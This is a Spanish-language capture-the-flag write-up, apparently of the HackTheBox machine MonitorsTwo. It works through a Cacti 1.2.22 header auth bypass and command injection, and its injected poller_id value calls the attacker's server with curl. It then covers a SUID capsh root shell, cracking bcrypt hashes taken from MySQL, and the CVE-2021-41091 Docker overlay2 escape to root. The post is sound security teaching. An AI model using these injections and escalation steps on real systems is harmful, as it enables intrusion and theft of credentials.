---
layout      : post
title       : "HackTheBox - MonitorsTwo"
author      : lanz
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/monitorstwo/539banner.png
category    : [ htb ]
tags        : [ docker, cracking, overlayFS, Cacti, command-injection, SUID, LFI ]
---
Máquina Linux nivel fácil. **Cacti** con inyección de comandos, binarios **SUID** y **LFI** internamente sobre contenedores de **moby**.

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/monitorstwo/539monitorstwoHTB.png" style="width: 100%;"/>

## TL;DR (Spanish writeup)

**Creada por**: [TheCyberGeek](https://www.hackthebox.eu/profile/114053).

"Es un simple permiso, no pasa nada".

Inicialmente, veremos un servicio web ejecutando el software `Cacti` en su versión `1.2.22`, investigando veremos que existe un `command-injection` relacionado con ella, pero para hacerlo real tendremos que bypassear autenticaciones, encontrar registros en bases de datos y realizar fuerza bruta, haremos esto manualmente. La concatenación de esto nos devolverá una Shell en un contenedor de `Docker` como el usuario `www-data`.

En el sistema existe el objeto `/sbin/capsh` con permisos `SUID`, lo aprovecharemos para obtener una terminal ahora como el usuario `root` dentro del contenedor.

Registrando el sistema en busca de vías para escapar del container, encontraremos unas credenciales del usuario `marcus` en la base de datos **cacti**, tendremos que jugar con `cracking` para ver la contraseña sin cifrar. Esta credencial nos permitirá movernos con `SSH` al `host` como el usuario `marcus`.

Como último paso, tendremos un mail del administrador de la compañía informando sobre potenciales vulnerabilidades en los sistemas. Una de esas vulns está relacionada con `Moby (Docker Engine)`, profundizaremos para enfrentarnos a un `Path Traversal`, un `LFI`, juegos con `SUID`, rutas con permisos deficientes y `Docker storage drivers`. Así, desde el ***host*** ejecutaremos un binario `SUID` (cualquiera, recordemos que somos `root` en el contenedor, por lo que podemos modificar cualquier objeto) alojado en el ***contenedor***, permitiéndonos obtener ejecución remota de comandos como el usuario `root` en el **host**.

...

### Clasificación de la máquina según la gentesita

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/monitorstwo/539statistics.png" style="width: 80%;"/>

Procesos reales, en conjunto, quizás no, pero todo real.

> La idea inicial de esta locura es tener mis "notas" por si algun día se me olvida todo (lo que es muuuy probable), leer esto y reencontrarme (o talvez no) 😄 La segunda idea surgio con el tiempo, ya que me di cuenta que esta es una puerta para personitas que como yo al inicio (o simplemente a veces) nos estancamos en este mundo de la seguridad, por lo que si tengo la oportunidad de ayudarlos ¿por qué no hacerlo?

> Un detalle es que si ves mucho texto, es por que me gusta mostrar tanto errores como exitos y tambien plasmar todo desde una perspectiva más de enseñanza que de solo pasos a seguir. Sin menos, muchas gracias <3

...

Sometimes.

1. [Reconocimiento](#reconocimiento).
2. [Enumeración](#enumeracion).
  * [Revisando Cacti](#puerto-80).
3. [Explotación](#explotacion).
  * [Cacti: Auth Bypass](#cacti-auth-bypass).
  * [Cacti: RCE](#cacti-rce).
4. [Movimiento lateral: Docker ~ www-data (docker) -> root (docker)](#docker-capsh).
5. [Movimiento lateral: MySQL ~ root (docker) -> marcus (host)](#docker-mysql-marcus-creds).
6. [Escalada de privilegios](#escalada-de-privilegios).
  * [Moby Dock](#moby-lfi).

...

# Reconocimiento [#](#reconocimiento) {#reconocimiento}

Como siempre, vamos a descubrir que servicios (puertos) tiene expuestos la máquina, para ello usaremos `nmap`:

```bash
nmap -p- --open 10.10.11.211 -v -oG initScan
```

| Parámetro | Descripción |
| --------- | :---------- |
| -p-       | Escanea todos los 65535 puertos |
| --open    | Devuelve solo los puertos que estén abiertos |
| -v        | Permite ver en consola lo que va encontrando |
| -oG       | Guarda el output en un archivo con formato grepeable para usar una [función **extractPorts**](https://pastebin.com/raw/X6b56TQ8) de [S4vitar](https://s4vitar.github.io/) que me extrae y colocar los puertos en la clipboard |

El escaneo nos dice:

| Puerto | Descripción |
| ------ | :---------- |
| 22     | **[SSH](https://www.hackingarticles.in/ssh-penetration-testing-port-22/)**: Permite obtener una terminal de forma segura en el sistema. |
| 80     | **[HTTP](https://searchnetworking.techtarget.com/definition/port-80)**: Existe un servidor web. |

> Usando la función `extractPorts` (referenciada antes) podemos copiar rápidamente los puertos en la clipboard, en este caso no es necesario (ya que tenemos pocos puertos), pero si tuviéramos varios puertos evitamos tener que escribirlos uno a uno:
 
> ```bash
> extractPorts initScan
> ```

Ya con los puertos copiados le pediremos ayuda de nuevo a `nmap`, en esta ocasión para que pruebe mediante unos scripts por default suyos a ver si encuentra algo para nosotros yyy además, que valide que versión de software está siendo ejecutada por cada servicio:

```bash
nmap -p 22,80 -sCV 10.10.11.211 -oN portScan
```

| Parámetro | Descripción |
| --------- | :---------- |
| -p        | Escaneo de los puertos obtenidos                       |
| -sC       | Muestra todos los scripts relacionados con el servicio |
| -sV       | Nos permite ver la versión del servicio                |
| -oN       | Guarda el output en un archivo                         |

Se nos revelan algunas cositas:

| Puerto | Servicio | Versión |
| :----- | :------- | :------ |
| 22     | SSH      | OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 |
| 80     | HTTP     | nginx 1.18.0 |

Solo que no es mucho lo obtenido, metámonos de frente con la máquina...

# Enumeración [#](#enumeracion) {#enumeracion}

Empezaremos descubriendo lo que hay detrás del servidor web...

## Cacti (Puerto 80) [📌](#puerto-80) {#puerto-80}

Si hacemos una petición web encontramos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/monitorstwo/539page80.png" style="width: 100%;"/>

Tal cual que la primera edición de esta máquina ([Monitors](https://lanzt.github.io/htb/monitors)), jugaremos con un **Cacti** (:

> 🌵 "**Cacti** es una completa solución para la generación de gráficos en red, diseñada para aprovechar el poder de almacenamiento y la funcionalidad para gráficas. Esta herramienta, desarrollada en *PHP*, provee un pooler ágil, plantillas de gráficos avanzadas, múltiples métodos para la recopilación de datos, y *manejo de usuarios*." ~ [Wikipedia](https://es.wikipedia.org/wiki/Cacti).

Tenemos su versión, si vamos a la web y filtramos, vemos un exploit:

* [Cacti: Unauthenticated Remote Code Execution](https://www.sonarsource.com/blog/cacti-unauthenticated-remote-code-execution/).

Upale, existe un `command-injection` jugando con `cabeceras HTTP` y campos no sanitizados. A jugar!

# Explotación [#](#explotacion) {#explotacion}

Vamos a seguir el artículo para entender los procesos.

## Cacti: Auth Bypass [📌](#cacti-auth-bypass) {#cacti-auth-bypass}

Lo primero que hace la vuln es bypassear una autenticación, esto para que el servidor web y su backend nos permita interactuar correctamente con el **Cacti** y con la futura explotación.

El objeto del que nos aprovecharemos se llama `remote_agent.php`, dentro está la validación que bypassearemos:

```php
<?php
// ...
if (!remote_client_authorized()) {
   print 'FATAL: You are not authorized to use this service';
   exit;
}
```

El contenido interesante de la función `remote_client_authorized()` sería:

```php
<?php
// ...
function remote_client_authorized() {
   // ...
   $client_addr = get_client_addr();
   // ...
   $client_name = gethostbyaddr($client_addr);
   // ...
   $pollers = db_fetch_assoc('SELECT * FROM poller', true, $poller_db_cnn_id);
   foreach($pollers as $poller) {
      if (remote_agent_strip_domain($poller['hostname']) == $client_name) {
         return true;
      // ...
```

Yyyy notamos algo llamativo en el cómo se obtiene el valor de `$client_addr` al llamar a la función `get_client_addr()`:

```php
<?php
// ...
function get_client_addr($client_addr = false) {
   $http_addr_headers = array(
       // ...
       'HTTP_X_FORWARDED',
       'HTTP_X_FORWARDED_FOR',
       'HTTP_X_CLUSTER_CLIENT_IP',
       'HTTP_FORWARDED_FOR',
       'HTTP_FORWARDED',
       'HTTP_CLIENT_IP',
       'REMOTE_ADDR',
   );

   $client_addr = false;
   foreach ($http_addr_headers as $header) {
      // ...
      $header_ips = explode(',', $_SERVER[$header]);
      foreach ($header_ips as $header_ip) {
         // ...
         $client_addr = $header_ip;
         break 2;
      }
   }
   return $client_addr;
}
```

La variable `$client_addr` está guardando la dirección **IP** del cliente que hace la petición y así válida si puede o no interactuar, peeeero a su vez la función `get_client_addr()` busca en distintas cabeceras **HTTP** esa dirección IP del cliente, por lo que si no existe un reverse-proxy o filtro que modifique la petición, como atacante podemos controlar el contenido de esas cabeceras!!

Y esto toma más fuerza si tenemos en cuenta que la tabla `poller` (de una consulta que hace previamente) **tiene por default** un registro con el **hostname** del servidor que está ejecutando el `Cacti` :O

```php
   // ...
   $pollers = db_fetch_assoc('SELECT * FROM poller', true, $poller_db_cnn_id);
   foreach($pollers as $poller) {
      if (remote_agent_strip_domain($poller['hostname']) == $client_name) {
         return true;
      // ...
```

Por lo que podemos modificar la petición y enviar alguno de los headers con la dirección IP víctima `10.10.11.211` o directamente contra el `localhost`/`127.0.0.1`. Validaría ese registro por default, vería que coincide con el que le estamos pasando y tadaaa, lograríamos el bypass!

Creemos un script que juegue y nos muestre si vamos por buen camino, primero validemos al hacer una petición sin la cabecera:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/monitorstwo/539bash_py_custom_cactiRCE_withoutHeaders_YouAreNotAuthorized.png" style="width: 100%;"/>

Efectivamente, nos devuelve el mensaje que vimos hace un rato, ahora metámosle cabeceras:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/monitorstwo/539bash_py_custom_cactiRCE_withHeaders_HTBip_YouAreNotAuthorized.png" style="width: 100%;"/>

Nop, seguimos con el mismo error, probando con `localhost` volvemos al error, pero con `127.0.0.1` cambia la cosa:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/monitorstwo/539bash_py_custom_cactiRCE_withHeaders_127ip_InvalidAgent.png" style="width: 100%;"/>

EPAAAA! Logramos bypassear tal y como nos indicó el post, por lo que el registro que existe en la tabla `poller` es `127.0.0.1`.

Ahora escalemos, volvamos esto una ejecución remota de comandos, también con ayuda del artículo...

## Cacti: RCE [📌](#cacti-rce) {#cacti-rce}

Existe una variable (`poller_id`) que guarda strings sin sanitizar, ella está siendo usada como parte de la ejecución de la función [proc_open](https://www.php.net/manual/es/function.proc-open.php) (que sirve para ejecutar un comando en el sistema), por lo que si nos ponemos agresivos, podemos lograr una inyección de comandos remotamente (:

Pero antes debemos hacer algo, necesitamos encontrar valores válidos en las bases de datos para que la lógica nos permita pasar a interactuar con la función vulnerable:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/monitorstwo/539google_cactiRCE_sonarCloud_remoteAgentPHP_logicFlawCode.png" style="width: 100%;"/>

* [sonarcloud.io](https://sonarcloud.io/project/issues?resolved=false&types=VULNERABILITY&id=SonarSourceResearch_cacti-blogpost&open=AYVi68k7Wm9EF-_N9Gwb).

A nosotros nos interesa el `case POLLER_ACTION_SCRIPT_PHP`:

```php
<?php

// ... retrieve poller items from database ...

foreach($items as $item) {
   switch ($item['action']) {
   // ...
   case POLLER_ACTION_SCRIPT_PHP: /* script (php script server) */
      // ...
      $cactiphp = proc_open(read_config_option('path_php_binary') . ' -q ' . $config['base_path'] . '/script_server.php realtime ' . $poller_id, $cactides, $pipes);
```

Pero para llegar a él tenemos unas cositas por delante:

* Como vemos en la imagen, se usan 3 parámetros, `local_data_ids` (que al parecer es un array o al menos lo interpreta así, por lo que pueda que debamos enviarlo como tal: `local_data_ids[]`), `host_id` y el juguetón `poller_id`.
* Además, para poder llegar a la función donde están esas 3 variables (`poll_for_data()`), pasamos por un `switch` con otro parámetro:

  ```php
  <?php
  // ...
  switch (get_request_var('action')) {
     case 'polldata':
        poll_for_data();
  ```

  Así que ya son 4 parámetros los que viajan en la petición.

Entoooonces, finamente debemos juntar esas variables, para que en la lógica, vayan a la base de datos e intenten extraer cositas, pero claro, en el mismo post nos indican, pueden existir infinidad de registros e ID's en al base de datos, por lo que hay que emplear ***fuerza bruta*** contra esos ID's.

Si logramos alguna respuesta, ya tendríamos acceso a la función `proc_open()` y, por lo tanto, solo sería ser agresivos con la variable `poller_id` buscando una inyección de comandos (:

> "The attacker must provide the corresponding id to make the database query return such an item. Since the ids are numbered in ascending order and hundreds of ids can be sent in a single request by providing an array, attackers can easily discover a valid identifier." ~ [Sonarsource](https://www.sonarsource.com/blog/cacti-unauthenticated-remote-code-execution/).

> Esto le da vida a lo que dijismos antes, trataremos la variable `local_data_ids` como un array.

Ahora, a seguir con el script:

Definimos los parámetros, el cómo viajan y ejecutamos, notamos cositaaaaaaaaaaaaaaaaaaaaaaas:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/monitorstwo/539bash_py_custom_cactiRCE_hostANDdata_IDS.png" style="width: 100%;"/>

Le definimos un array de 5 iteraciones, donde claramente no sabemos si alguna puede tener contenido en la base de datos, pero de eso se trata la ***fuerza bruta***, de "adivinar", y **adivinamos cosaaaas**!

Vemos que sí extrae contenido, específicamente con el `host_id` número `1` (ya que la iteración va del **0** al **4**), y los `local_data_ids` número `1`, `2`, `3`, `4` y `5` (que incluso pueden ser más, sería agrandar los valores del array) :D 

¡Así que, con esta base, solo nos queda manipular el parámetro `poller_id` y esperar que alguno de los `local_data_ids` tengan seteado `POLLER_ACTION_SCRIPT_PHP`, esto para finalmente entrar en la función `proc_open()` y CAUSAR UNA INYECCIÓN DE COMANDOOOOS REMOTAMENTE!! A darle.

> La inyección de comandos en Linux es muy sencilla, simplemente debemos **añadir** el nuestro sin importar si el legitimo se ejecuta o no, se puede hacer de varias formas, la clasica es usar el caracter `;` como separador: `comando_anterior; comando_malicioso` (podemos agregarle al final un `;` para que cierre nuestro comando y no se concatene con otra cosa).

* [What is OS command injection?](https://portswigger.net/web-security/os-command-injection)

Probando comandos que deberían devolvernos un output (`id`, `hostname`, `whoami`, etc) no obtenemos nada en la respuesta de la petición, por lo que, o tenemos algo mal o pueda que la inyección sea **blind** (que no muestra output), validemos esto último.

Levantemos un servidor con `Python3` (`python3 -m http.server`) , después en el comando le decimos a la máquina víctima que ejecute una petición hacia nuestro servidor (`curl` o `wget`) ¿y si la obtenemooooos? Pues ya estamos! YA ESTAMOS!! e.e

```python
    # ...
    "host_id" : "1",·                                                                                                                                                                                                                   
    "poller_id" : "1; curl http://10.10.14.34:8000/hola-te.veo;"·                                                                                                                                                                       
}
# ...
```

Ejecutamooooooos y en nuestro servidooor:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/monitorstwo/539bash_py_custom_cactiRCE_pollerIDinjection_CURL_done.png" style="width: 100%;"/>

LIIIIIIISTOOOO! ¡Recibimos la petición, por lo queeee, tenemos ejecución remota de comandooooooooooooooooooos!

> 🌵 Te dejo de tarea obtener la reverse shell, esta bien sencilla, además tienes una pista ahí 🏜️

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/monitorstwo/539bash_py_custom_cactiRCE_pollerIDinjection_reverseShell_done.png" style="width: 100%;"/>

> SI quieres hacerla linda y completamente funcional, cae [acá](https://lanzt.gitbook.io/cheatsheet-pentest/tty).

---

# capsh: www-data -> root [#](#docker-capsh) {#docker-capsh}

Algo que notamos al obtener la reverse shell es que no estamos en la máquina host, si no, en un contenedor, el cual -contiene- todo él -contenido- (e.e) del servidor web, lo sabemos, ya que entre los procesos internos iniciales del sistema se encuentra la traza:

```bash
www-data@50bca5e748b0:/var/www/html$ cat /proc/1/cgroup
# ...
0::/docker/50bca5e748b0e547d000ecb8a4f889ee644a92f743e129e52f7a37af6c62e51e
```

Porrrr lo que debemos buscar una manera de "escapar" del contenedor y llegar al **host**.

...

Dando vueltas vemos un objeto con permisos [SUID](https://www.ibiblio.org/pub/linux/docs/LuCaS/Manuales-LuCAS/doc-unixsec/unixsec-html/node56.html) distinto a los que siempre encontramos:

```bash
www-data@50bca5e748b0:/var/www/html$ find / -perm -4000 -ls 2>/dev/null
# ...
     5431     32 -rwsr-xr-x   1 root     root        30872 Oct 14  2020 /sbin/capsh
# ...
```

> ⚫ "El bit SUID activado sobre un fichero ***indica que todo aquél que ejecute el archivo va a tener durante la ejecución los mismos privilegios que quién lo creó***." ~ [ibiblio.org](https://www.ibiblio.org/pub/linux/docs/LuCaS/Manuales-LuCAS/doc-unixsec/unixsec-html/node56.html).

Opa, curioso curioso, esta herramienta nos ayuda a ver las `capabilities` que existen en un sistema (permisos más pequeños, ya hemos hablado de ellos en otros posts).

Si vamos a [GTFOBins](https://gtfobins.github.io/gtfobins/capsh/#suid) (un repo con muuuuuchas maneras de explotar distintos binarios de **Linux**) encontramos que podemos obtener una **shell** (en este caso) como `root` (al ser él el creador del archivo y owner actual) de esta forma:

```bash
capsh --gid=0 --uid=0 --
```

* `gid`: Group ID `0` hace referencia a ***root***.
* `uid`: User ID `0` hace referencia a ***root***.
* `--`: Indica que ejecute una `/bin/bash`.

Si lo ejecutamooooos:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/monitorstwo/539bash_docker_wwwdataSH_capshSUID_rootSH.png" style="width: 100%;"/>

Somos `root`, a investigar que podemos hacer con esto!

---

# mysql: root (docker) -> marcus (host) [#](#docker-mysql-marcus-creds) {#docker-mysql-marcus-creds}

Si nos fijamos, en la **raíz** (`/`) del sistema hay un script que se conecta a `MySQL`, hace una inserción y actualiza la contraseña de **admin** en la tabla `user_auth`, pero no hay nada a simple vista útil, interactuemos con el servidor **MySQL**:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/monitorstwo/539bash_docker_rootSH_catentryPointSCRIPT.png" style="width: 100%;"/>

```bash
mysql --host=db --user=root --password=root cacti
```

Recorriendo el servicio, llegamos efectivamente a la tabla `user_auth`, en ella existe dos usuarios interesantes, `admin` y `marcus`, entre los datos que refleja la tabla existen contraseñas hasheadas con el algoritmo [bcrypt](https://en.wikipedia.org/wiki/Bcrypt), tomemos esas contraseñas, copiémoslas a un archivo de nuestro sistema y procedamos a jugar con ***fuerza bruta*** a ver si logramos crackearlas, recordemos que existe el servicio **SSH** en la máquina host, pueden ser por ahí los tiros...

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/monitorstwo/539bash_docker_rootSH_mysql_userAUTHtable_credsBCRYPT.png" style="width: 100%;"/>

Yo usaré [John The Ripper](https://www.freecodecamp.org/news/crack-passwords-using-john-the-ripper-pentesting-tutorial/):

```bash
➧ cat mysql_docker_hashes.txt 
admin:$2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC
marcus:$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C
```

```bash
john -w:/usr/share/wordlists/rockyou.txt mysql_docker_hashes.txt
```

* `-w`: Le indicamos qué lista de palabras queremos que use en busca de algún match.

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/monitorstwo/539bash_john_credsBCRYPT_crackedMARCUSpassword.png" style="width: 100%;"/>

Ojooo, nos devuelve un match contra el usuario `marcus`, me gusta, podemos dejarlo ahí en segundo plano a ver si encuentra algo con **admin**.

En el contenedor ya somos `root`, por lo que esa contraseña realmente no creo que esté enfocada ahí, así que usemos `ssh` y validemos esa contraseña contra el usuario `marcus`:

```bash
ssh marcus@10.10.11.211
```

Yyyyy:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/monitorstwo/539bash_ssh_marcusSH_host.png" style="width: 100%;"/>

ESOOO! Estamos en el ***host*** como el usuario `marcus` 🕺💃

> Ojito que tenemos **mails**

---

# Escalada de privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}

Teniendo en cuenta que es raro encontrarse con **mails**, vamos a explorar eso, la ruta donde se guardan es:

```bash
/var/mail/<user>
# En nuestro caso
/var/mail/marcus
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/monitorstwo/539bash_marcusSH_cat_VarMailMarcus_mailWithVulns.png" style="width: 100%;"/>

FUFFF, se puso interesante esto...

Nos alertan de 3 vulnerabilidades que existen en el sistema:

1. Una enfocada en el `kernel` (puede ser por acá).
2. Otra en un **XSS** sobre `Cacti`, pero esta es muy poco probable que nos lleve a algún lado, así que descartada.
3. La última sobre habla de `Moby - Docker` y ***contenedores***, esta es muy llamativa, teniendo en cuenta que tenemos acceso a un contenedor.

La **tercera** (`3`) es la primera que probaremos, más (mucho más) si revisamos con cuidado los procesos internos que se están ejecutando:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/monitorstwo/539bash_marcusSH_psFAUX_mobyPROCESS_relatedTOcve.png" style="width: 100%;"/>

EEEJEEE! Hay dos contenedores siendo ejecutados por `moby`, así que, nada más que decir, a romper esto.

## Moby Dock [📌](#moby-lfi) {#moby-lfi}

Lo primero es entender bien el CVE (`CVE-2021-41091`).

* [CVE-2021-41091 Detail - NVD](https://nvd.nist.gov/vuln/detail/CVE-2021-41091).
* [Improper Preservation of Permissions in docker - Snyk](https://security.snyk.io/vuln/SNYK-SLES150-DOCKER-2661076).

Nos hablan de [moby](https://mobyproject.org/):

> 🐳 "**Docker’s Moby Project** disassembles the foundational components of Docker Engine into a **modular toolkit that other container-based systems can reuse**." ~ [What Is Moby and How Does It Relate to Docker? - How-To Geek](https://www.howtogeek.com/devops/what-is-moby-and-how-does-it-relate-to-docker/).

* [Moby, un paso más para el mundo de los contenedores - Open Expo Europe](https://openexpoeurope.com/es/moby-paso-mas-contenedores/).

Uhh, interesante... Lo siguiente a tener en cuenta es que esta vuln explota un [Path Traversal](https://keepcoding.io/blog/que-es-path-traversal/), ella básicamente permite ver objetos fuera de una ruta específica, por lo general llevada a descubrir archivos del sistema. En este caso el CVE nos informa que también mediante el **Path Traversal** se pueden ejecutar objetos, por lo que ya lo llevaríamos prácticamente a un `LFI`.

Pero la pregunta importante es ¿cómo es que sucedió esto? Bien, también nos lo dice:

> 💬 "... the data directory (**typically** `/var/lib/docker`) contained subdirectories with **insufficiently restricted permissions** ..." ~ [CVE-2021-41091 - NVD](https://nvd.nist.gov/vuln/detail/CVE-2021-41091).

El directorio con toda la "data", hay que investigar esto.

Lo último reeee interesante es:

> 💬 "When containers included executable programs with extended permission bits (such as `setuid`), unprivileged Linux users could discover and execute those programs." ~ [CVE-2021-41091 - NVD](https://nvd.nist.gov/vuln/detail/CVE-2021-41091). 

NOSOTROS TENEMOS UN BINARIO CON `SUID` EN EL CONTENEDOOOOOR!! 

Así que si logramos el **Path Traversal**, podremos ver el binario alojado en el contenedor (`/sbin/capsh`) desde el host, pero no solo eso, podremos ejecutarlo :O Además ya vimos como explotarlo, por lo que sería realizar lo mismo pero ahora consiguiendo una terminal como `root` en el `HOST`.

METÁMOSLE!

...

Necesitamos saber como interactuar con el directorio `/var/lib/docker`, ya que si intentamos ver su contenido, obtenemos error de permisos:

```bash
marcus@monitorstwo:~$ ls -la /var/lib/docker/
ls: cannot open directory '/var/lib/docker/': Permission denied
```

Si buscamos salvajemente por internet llegamos a algo llamado [Docker storage drivers](https://docs.docker.com/storage/storagedriver/select-storage-driver/):

> "The storage driver controls how images and containers are stored and managed on your Docker host." ~ [Docker storage drivers - Docker Docs](https://docs.docker.com/storage/storagedriver/select-storage-driver/).

Además, se nos muestran distintos tipos de `storage drivers`, el más famoso y usado se llama `overlay2`, ya que no necesita configuraciones extra y es soportado por todas las distribuciones **Linux**.

Si seguimos profundizando, llegamos a info detallada de `overlay2`:

* [Use the OverlayFS storage driver - Docker Docs](https://docs.docker.com/storage/storagedriver/overlayfs-driver/).
* [How the **overlay2** driver works - Docker Docs](https://docs.docker.com/storage/storagedriver/overlayfs-driver/#how-the-overlay2-driver-works).

> "To view the **mounts** which exist when you use the `overlay storage driver` with Docker, use the `mount` **command**. " ~ [How the **overlay2** driver works - Docker Docs](https://docs.docker.com/storage/storagedriver/overlayfs-driver/#image-and-container-layers-on-disk)

Si le hacemos caso ejecutando el comando `mount`, encontramooooooos:

```bash
mount | grep overlay
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/monitorstwo/539bash_marcusSH_mount_grepOVERLAY.png" style="width: 100%;"/>

BIEEEN! Tenemos la ruta donde se está guardando la información de los 2 contenedores, pero antes de seguir entendamos algunas cositas:

> "**OverlayFS** layers two directories on a single Linux host and presents them as a single directory. ***These directories are called layers and the unification process is referred to as a union mount***. OverlayFS refers to the **lower** directory as `lowerdir` and the upper directory as `upperdir`. The unified view is exposed through its own directory called `merged`." ~ [How the **overlay** driver works - Docker Docs](https://docs.docker.com/storage/storagedriver/overlayfs-driver/#how-the-overlay-driver-works).

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/monitorstwo/539google_DockerDocs_overlayFS_upper_lower_merged.jpg" style="width: 100%;"/>

> Tomada de: [How the **overlay** driver works - Docker Docs](https://docs.docker.com/storage/storagedriver/overlayfs-driver/#how-the-overlay-driver-works).

> * `LowerDir`: Includes the filesystems of all the layers inside the container except the last one
> * `UpperDir (diff)`: The filesystem of the top-most layer of the container. This is also where any run-time modifications are reflected.
> * `MergedDir (merged)`: A combined view of all the layers of the filesystem.
> * `WorkDir (work)`: An internal working directory used to manage the filesystem.

> [Where are my container's files? Inspecting container filesystems - Pixie Blog](https://blog.px.dev/container-filesystems/).

Y por último, un ejemplo práctico que me gusto mucho para dejar claro el tema de los `layers`:

* [Understanding Container Images, Part 3: Working with Overlays - Cisco Blogs](https://blogs.cisco.com/developer/373-containerimages-03).

Listos, sabemos que todas las capas son importantes, pero las capas `diff` y `merged` son las que nos interesan, sigamos.

* Recomendado: [A Compendium of Container Escapes (PDF) - BLACK HAT 2019](https://i.blackhat.com/USA-19/Thursday/us-19-Edwards-Compendium-Of-Container-Escapes-up.pdf).

...

Si probamos a listar el contenido `merged` (la combinación de todas las capas) del contenedor `4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec` vemos:

```bash
ls -al /var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/monitorstwo/539bash_marcusSH_lsLA_container_4ec0_mergedLAYER.png" style="width: 100%;"/>

EPALE! Ahora si podemos ver el contenidoooooowowowo (: Pos sigamos la lógica del CVE, busquemos el binario `/sbin/capsh` y terminemos de romper esto...

```bash
ls -al /var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged/sbin/capsh
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/monitorstwo/539bash_marcusSH_lsLA_container_4ec0_mergedLAYERsbinCAPSH_wrongContainer.png" style="width: 100%;"/>

F, si nos fijamos en los permisos del archivo, no tiene seteado el privilegio `SUID` (debería haber una `s` en lugar de una `x` en los permisos del **owner**)... Jmmmm, ¿qué se te ocurre?

¿Si te acuerdas que son dos contenedores los que están siendo ejecutados? Pueeeees si validamos con el otro contenedoooooooor:

```bash
ls -al /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/sbin/capsh
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/monitorstwo/539bash_marcusSH_lsLA_container_4ec0_mergedLAYERsbinCAPSH_correctContainer.png" style="width: 100%;"/>

TAMOOOOOOOS! Logramos el **Path Traversal**!!!! Solo nos quedaría validar, si tenemos acceso de ejecución (**LFI**), ejecutamos:

```bash
/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/sbin/capsh
```

Peeeero, obtenemos un error:

```bash
/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/sbin/capsh: symbol lookup error: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/sbin/capsh: undefined symbol: cap_iab_get_proc
```

Igual, por eso no nos vamos a poner tristes. Ya somos `root` en el contenedor, por lo tanto, podemos asignarle, quitarle, modificarle y de todo a cualquier archivo/objeto, por lo que asignémosle el permiso `SUID` a la `bash`, pero copiemos el binario original a una ruta nuestra y seguimos, así no dañamos la experiencia de los demás:

```bash
root@50bca5e748b0:/# cd /tmp
root@50bca5e748b0:/tmp# mkdir test
root@50bca5e748b0:/tmp# cd test/
root@50bca5e748b0:/tmp/test# cp /bin/bash .
root@50bca5e748b0:/tmp/test# chmod +s bash
root@50bca5e748b0:/tmp/test# ls -la bash
-rwsr-sr-x 1 root root 1234376 May 12 23:55 bash
```

Listones, validemos que podamos verlo desde el `host`:

```bash
marcus@monitorstwo:~$ ls -al /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/tmp/test/bash
-rwsr-sr-x 1 root root 1234376 May 12 23:55 /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/tmp/test/bash
```

Perfectooo, el último paso para ejecutarlo con el permiso `SUID` sería agregarle el parámetro `-p`:

```bash
/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/tmp/test/bash -p
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/monitorstwo/539bash_marcusSH_bashSUID_container_c41d_mergedLAYER_rootSH.png" style="width: 100%;"/>

FINALMENTE, ESTAMOS EN EL SISTEMA COMO EL USUARIO `root` 😅 🥵

Brutalidad, brutalidad!

Inspeccionemos las flags:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/monitorstwo/539flags.png" style="width: 100%;"/>

...

Una máquina bien disfrutable, sobretodo por lo manual que fue, me gusto mucho el tema de `moby`, qué locura de escalada.

El jugar con `Cacti` me lo esperaba, no me esperaba hacerlo tan manual, pero me encanto hacerlo así (sé que había scripts, pero fue bien lindo entenderlo).

